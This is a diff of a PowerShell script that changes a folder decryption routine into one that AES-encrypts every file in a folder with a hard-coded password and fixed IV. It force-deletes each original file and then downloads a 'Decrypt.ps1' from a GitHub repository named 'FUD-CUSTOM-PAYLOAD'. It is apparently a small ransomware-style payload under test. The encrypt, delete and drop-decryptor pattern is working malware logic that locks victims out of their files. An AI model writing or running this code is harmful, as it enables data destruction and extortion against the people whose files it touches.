@@ -1,44 +1,47 @@
-# Define the folder path containing the encrypted files
+# Define the folder path containing the files to encrypt 
 $folderPath = "F:\Testing"
 
-# Prompt user to enter password
-$password = Read-Host -Prompt "Enter your password" -AsSecureString
+# Set the password
+$password = "12345"
+
+# Convert the password to a secure string
+$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
 
 # Convert secure string password to plain text
-$plaintextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))
+$plaintextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePassword))
 
-# Define decryption method
-$decryptionMethod = @{
+# Define encryption method
+$encryptionMethod = @{
     KeySize = 256
     BlockSize = 128
     Mode = 'CBC'
     Padding = 'PKCS7'
 }
 
-# Function to decrypt a file
-function Decrypt-File {
+# Function to encrypt a file
+function Encrypt-File {
     param (
         [string]$FilePath,
-        [hashtable]$DecryptionMethod
+        [hashtable]$EncryptionMethod
     )
 
-    # Generate AES decryption object
+    # Generate AES encryption object
     $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.KeySize = $DecryptionMethod['KeySize']
-    $aes.BlockSize = $DecryptionMethod['BlockSize']
-    $aes.Mode = $DecryptionMethod['Mode']
-    $aes.Padding = $DecryptionMethod['Padding']
+    $aes.KeySize = $EncryptionMethod['KeySize']
+    $aes.BlockSize = $EncryptionMethod['BlockSize']
+    $aes.Mode = $EncryptionMethod['Mode']
+    $aes.Padding = $EncryptionMethod['Padding']
 
     # Set key and IV
     $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($plaintextPassword.PadRight(32))  # Pad password to match key size (for AES-256)
-    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")  # Use the same IV used during encryption
+    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")  # Use a unique IV
 
     # Create file streams
     $fileStreamIn = [System.IO.File]::OpenRead($FilePath)
-    $fileStreamOut = [System.IO.File]::Create(($FilePath -replace '\.enc$', ''))  # Remove .enc extension for decrypted file
+    $fileStreamOut = [System.IO.File]::Create("$FilePath.enc")
 
     # Create crypto streams
-    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStreamOut, $aes.CreateDecryptor(), 'Write')
+    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStreamOut, $aes.CreateEncryptor(), 'Write')
 
     # Copy data through crypto stream
     $buffer = New-Object byte[] 4096
@@ -52,11 +55,20 @@ function Decrypt-File {
     $fileStreamIn.Close()
     $fileStreamOut.Close()
 
-    # Remove the .enc file
+    # Delete the original file
     Remove-Item -Path $FilePath -Force
 }
 
-# Decrypt files in the folder
-Get-ChildItem -Path $folderPath -Filter *.enc | ForEach-Object {
-    Decrypt-File -FilePath $_.FullName -DecryptionMethod $decryptionMethod
+# Encrypt files in the folder
+Get-ChildItem -Path $folderPath -File | ForEach-Object {
+    Encrypt-File -FilePath $_.FullName -EncryptionMethod $encryptionMethod
 }
+
+# Define the URL of the raw script on GitHub for Decrypt.ps1
+$decryptScriptUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1"
+
+# Define the local path where you want to save Decrypt.ps1
+$decryptScriptPath = Join-Path -Path $folderPath -ChildPath "Decrypt.ps1"
+
+# Download the Decrypt.ps1 script from GitHub
+Invoke-WebRequest -Uri $decryptScriptUrl -OutFile $decryptScriptPath
